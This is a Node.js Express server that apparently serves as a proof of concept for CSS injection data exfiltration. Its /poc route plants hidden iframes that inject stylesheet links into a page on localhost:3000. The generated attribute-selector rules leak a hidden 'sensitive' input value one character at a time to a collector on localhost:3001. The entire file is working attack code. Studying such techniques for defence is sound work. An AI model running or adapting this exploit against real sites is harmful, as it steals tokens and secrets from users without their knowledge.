var express = require('express');
var app = express();
var colors = require('colors');

var length = 11;
var charset = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789".split('');
var state;

function generateCss(prefix, index) {
    return charset.map((c) => `input[name=sensitive][value^="${prefix + c}"]{background-image:url(//localhost:3001/push?c=${c}&i=${index})} `).join('');
}

function nocache(req, res, next) {
  res.header('Cache-Control', 'private, no-cache, no-store, must-revalidate');
  res.header('Expires', '-1');
  res.header('Pragma', 'no-cache');
  next();
}

app.use(nocache);

app.get('/', function(req, res) {
    res.header('Content-Type', 'text/html');

    res.send('<a href="/poc">POC</a>');
});

app.get('/poc', function(req, res) {
    var startTime = +new Date;

    console.log(`${'[ATTACK]'.red} /poc`);

    state = {
        promises: [],
        resolvers: [],
        buffer: ''
    };

    res.header('Content-Type', 'text/html');

    res.write("<p>Fetching value...</p>");

    for(var i = 0; i < length; i++) {
        (function(i) {
            state.promises[i] = new Promise(function(resolver) {
                state.resolvers[i] = function() {
                    resolver();

                    if(i < length - 1) {
                        var styles = `<link rel="stylesheet" href="http://localhost:3001/styles?i=${i}"/>`;
                        res.write(`<iframe style="display: none" src="http://localhost:3000/?input=${escape(styles)}"></iframe>`);
                    }
                };
            });
        })(i);
    }

    state.resolvers[0]();

    state.promises[length - 1].then(function() {
        res.end(`Found: "${state.buffer}" in ${(+new Date - startTime) / 1000} seconds.`);
    });
});


app.get('/styles', function(req, res) {
    console.log(`${'[ATTACK]'.red} /styles?i=${req.query.i}`);

    var index = parseInt(req.query.i);

    res.header("Content-Type", "text/css");

    res.send(generateCss(state.buffer, index));
});

app.get('/push', function(req, res) {
    console.log(`${'[ATTACK]'.red} /push?i=${req.query.i}&c=${req.query.c}`);

    var char = req.query.c;
    var index = parseInt(req.query.i);

    state.buffer += char;

    if(state.resolvers[index + 1]) {
        state.resolvers[index + 1]();
    }

    res.send("ok");
});

module.exports.app = app;
